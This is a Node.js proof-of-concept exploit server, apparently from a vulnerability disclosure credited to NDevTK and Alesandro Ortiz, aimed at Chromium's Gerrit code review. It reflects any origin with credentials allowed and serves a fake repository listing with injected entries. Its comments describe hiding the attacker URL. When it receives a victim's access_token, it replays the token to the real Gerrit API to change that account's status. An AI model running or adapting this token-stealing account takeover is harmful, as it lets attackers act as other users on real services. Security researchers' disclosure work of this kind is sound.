import { request, createServer } from 'https';
import { parse } from 'url';
import { readFileSync } from 'fs';

const port = 1338;

const app = (req, res) => {
  try {
    // Use this to avoid an error modal about Gerrit account missing.
    // We could leave modal to distract from the main error that shows the attacker URL.
    // Attacker URL could also be obscured further.
    console.info('Request origin:', req.headers.origin);
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
    res.setHeader('Access-Control-Allow-Credentials', true);
  } catch (e) {
    console.info('Error');
  }

  res.statusCode = 200;

  // Emulate a file listing (optional but errors look bad)
  const dirResponse = {
    id: 'b939af01ca07f0caa68fb8d264a68b91e86efe70',
    entries: [
      {
        mode: 33188,
        type: 'blob',
        id: '54c90ede642a93580a98eb4ed6e821749b04a989',
        name: '.gitignore'
      },
      {
        mode: 33188,
        type: 'blob',
        id: 'daebd5231a3ec9aafd58e6f4075f3b63e4c3bd53',
        name: 'Changes.md'
      },
      {
        mode: 33188,
        type: 'blob',
        id: '957da92f63926bf6013845f0ff0602d1f1620e0a',
        name: 'CleanSpec.mk'
      },
      {
        mode: 33188,
        type: 'blob',
        id: '74b54fadd522b739407d7d71b4ea3503fc666aeb',
        name: 'Deprecation.md'
      },
      {
        mode: 33188,
        type: 'blob',
        id: '44781a70880412fdd9007cc2bec16a4b09924c6d',
        name: 'METADATA'
      },
      {
        mode: 33188,
        type: 'blob',
        id: '97fda40f7b2006ae5f6bc895a4a1d602ceb991c6',
        name: 'OWNERS'
      },
      {
        mode: 33188,
        type: 'blob',
        id: 'ce7515044e84d15868077c0a8319fc401442fc4d',
        name: 'PREUPLOAD.cfg'
      },
      {
        mode: 33188,
        type: 'blob',
        id: '47809a95ac45ec11840166adac5eb31d3ed9c788',
        name: 'README.md'
      },
      {
        mode: 33188,
        type: 'blob',
        id: 'ea4788a1bc26b698697f9a1499cd2164e0d03d3d',
        name: 'Usage.txt'
      },
      {
        mode: 33188,
        type: 'blob',
        id: 'b31578a29b5c64e4fa690b8f4062e045ba01185a',
        name: 'buildspec.mk.default'
      },
      {
        mode: 16384,
        type: 'tree',
        id: '9a970257168359bda2226ac81dd945e41a3db224',
        name: 'common'
      },
      {
        mode: 33188,
        type: 'blob',
        id: '004788a1bc26b698697f9a1499cd2164e0d03d3d',
        name: 'HELLO_FROM_AO.txt'
      },
      {
        mode: 33188,
        type: 'blob', // Type param will be injected as CSS class in an element, but this is of limited use
        id: '00970257168359bda2226ac81dd945e41a3db224',
        name: 'HELLO_FROM_AO_SERVER' // Will be added as text
      }
    ]
  };

  const query = parse(req.url, true).query;
  if (query?.format == 'JSON') {
    res.end(")]}'" + JSON.stringify(dirResponse));
  } else if (query?.format == 'TEXT') {
    res.end('TEXT RESPONSE');
  } else {
    res.end('Hello World');
  }

  if (!query.access_token) return;

  const payloadTimestamp = new Date();
  // const payload = ' { "display_name": "PoC display name! Set on '+payloadTimestamp+'" }';
  const payload =
    ' { "status": "Hello from PoC by NDevTK. This field was set on ' +
    payloadTimestamp +
    ' by PoC script hosted on Alesandro Ortiz\'s server." }';
  const options = {
    hostname: 'chromium-review.googlesource.com',
    port: 443,
    path:
      '/a/accounts/self/status?access_token=' +
      encodeURIComponent(query.access_token),
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length
    }
  };

  const api = request(options, (response) => { });
  api.write(payload);
  api.end();
};

createServer(
  {
    key: readFileSync('privkey.pem'),
    cert: readFileSync('fullchain.pem')
  },
  app
)
  .listen(port, () => {
    console.log(`Server running on port ${port}`);
  });
